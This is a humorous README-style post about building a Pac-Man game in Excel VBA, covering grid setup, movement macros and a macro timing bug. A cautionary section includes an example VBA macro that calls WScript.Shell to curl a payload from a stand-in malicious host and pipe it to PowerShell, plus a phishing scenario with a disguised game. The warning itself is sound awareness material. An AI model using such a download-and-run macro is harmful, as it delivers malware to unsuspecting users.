# PacMan-On-Excel-
 Making Pac-Man in Excel was a wild ride of creativity, problem-solving, and accidental macro-bombing. It reminded me of the sheer versatility of Excel—and the importance of saving your work. If nothing else, it’s a fun story to tell.

![Screenshot 2025-01-14 234556](https://github.com/user-attachments/assets/52bb6182-e739-48cc-b16f-cd85c6daf741)



---

The Big Idea!
It started as a harmless experiment. I thought, "Hey, I've got some time and a head full of VBA (Visual Basic for Applications). Why not make something fun in Excel?" After all, it's not every day you get to combine retro gaming and spreadsheets. The plan was simple:
Build a grid to act as the game board.
Use VBA to move Pac-Man with arrow keys.
Add ghosts that chase Pac-Man (with basic AI, of course).
Score points by eating dots.

What could possibly go wrong?

---

Building the Game
Step 1: Setting the Stage
I created a 10x10 grid in Excel. Adjusted the column widths, and row heights, and made the cells look like a clean little game board. Pac-Man was a bright yellow emoji (🟡), and the ghosts were charming little 👻 emojis. The dots were simple dots (because, well, dots).
Step 2: Writing the VBA Code
This was the fun part. I whipped up macros for Pac-Man's movement:
Sub MovePacManUp()
    MovePacMan "UP"
End Sub

Sub MovePacManDown()
    MovePacMan "DOWN"
End Sub
Pac-Man zipped around the board flawlessly. I was starting to feel pretty smart.
Step 3: Adding the Ghosts
The ghosts were a bit trickier. They needed to move on their own, and ideally, they'd chase Pac-Man. I coded a basic AI that made them "smarter" (read: they sort of stumbled toward Pac-Man). The ghosts worked! Well, kind of. Sometimes they got stuck in a corner and had an existential crisis, but that's beside the point
The Macro Mayhem Begins (- _ -)
The "Let's Make It Better" Moment
Here's where things went off the rails. I thought, "Wouldn't it be cool if the ghosts moved faster as the score increased?" So, I added speed scaling. It worked fine at first. Pac-Man was zipping around, eating dots, and the ghosts got progressively faster. Too fast.
The Macro-Bomb
One tiny misstep in my timing logic, and the macros started overlapping. Ghosts were teleporting, dots were disappearing, and Pac-Man got stuck in a loop of infinite movement. Then the kicker: Excel froze.
I had unleashed a macro monster.
How This Could Go Very Wrong
Here's the thing about VBA macros: they're incredibly powerful, but with great power comes great responsibility - and great vulnerability. What started as a harmless game could, in the wrong hands, be turned into a Trojan horse. Here's how:
Embedding Malicious Code

VBA allows you to execute shell commands using Shell or CreateObject("WScript.Shell"). This means a malicious actor could embed commands to open a reverse shell, granting remote access to the victim's system.

Example of a malicious command:
Sub OpenShell()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "cmd.exe /c curl http://malicious-site.com/payload.exe | powershell.exe"
End Sub
This code could download and execute malicious files without the user even knowing.
2. Disguising Intent
The game's macros could be written to hide malicious functionality under the guise of "game logic." For example, a ghost's movement macro could secretly trigger commands to exfiltrate data or log keystrokes.

3. Exploiting Trust
Many users are too quick to enable macros when prompted by Excel. A game like this, sent as a "fun distraction," could lure someone into enabling macros, unknowingly compromising their system.

Theoretical Attack Scenario
Imagine you receive an email from a friend saying, "Check out this cool Pac-Man game I made in Excel!" Intrigued, you download it and enable macros. While you're playing, the hidden macros are:
Sending your system info to a remote server.
Opening a backdoor using PowerShell.
Logging your activity.

By the time you've realized something's off, the damage is done.
Lessons Learned (the Hard Way)
After a lot of Ctrl+Alt+Deleting and "End Task" tantrums, I managed to regain control. Here's what I learned:
Test Macros Incrementally: Adding too many moving parts without thorough testing is like juggling chainsaws - dangerous and messy.
Plan for Timing Conflicts: When macros trigger other macros, chaos can ensue. Double-check your logic.
Always Save Before Running Macros: I can't stress this enough. Save. Every. Single. Time.
Beware of What You Enable: Only enable macros from trusted sources. Double-check the code if you're unsure.

The Redemption Arc
I eventually fixed the timing issues and refined the ghost AI. The game now works like a charm. Pac-Man moves smoothly, ghosts are just smart enough to be annoying, and the score updates beautifully. Excel didn't even crash once during the final tests.
Was it worth the chaos? Absolutely. Watching Pac-Man munch dots in Excel is a joy I didn't know I needed.
Would I Recommend This?
If you've got some VBA skills and a sense of humor, go for it. Making a Pac-Man game in Excel is the perfect mix of geeky fun and frustration. But remember: macros are powerful tools. In the wrong hands, they're weapons.
Always verify macro-enabled files before opening them, and never blindly trust a file - even if it's disguised as a fun game.
